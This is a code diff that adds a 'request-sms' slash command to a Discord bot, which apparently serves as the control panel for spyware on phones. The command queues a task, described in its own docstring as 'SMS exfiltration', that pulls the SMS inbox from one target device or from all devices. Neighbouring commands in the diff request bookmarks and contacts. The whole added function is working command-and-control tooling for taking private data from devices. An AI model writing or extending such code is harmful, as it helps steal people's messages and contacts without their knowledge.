@@ -504,6 +504,43 @@ async def request_bookmarks(
 
 
 @bot.tree.command(
+    name="request-sms",
+    description="Request SMS inbox from a device (or all devices).",
+)
+@app_commands.describe(device="Target device name (or '*' for all devices)")
+async def request_sms(
+    interaction: discord.Interaction,
+    device: str = "*",
+) -> None:
+    """Queue an SMS exfiltration task. Requires READ_SMS to be granted on device."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "request-sms")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "request-sms", f"device={device}")
+
+    server_response = await call_server(
+        "/admin/queue-task",
+        method="POST",
+        json_body={
+            "device_name": device,
+            "task_type": "request-sms",
+            "parameters": {},
+        },
+    )
+    if server_response:
+        response = format_server_simple(server_response)
+    else:
+        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
+
+    await interaction.response.send_message(response)
+
+
+@bot.tree.command(
     name="request-contacts",
     description="Request contacts from a device (or all devices).",
 )
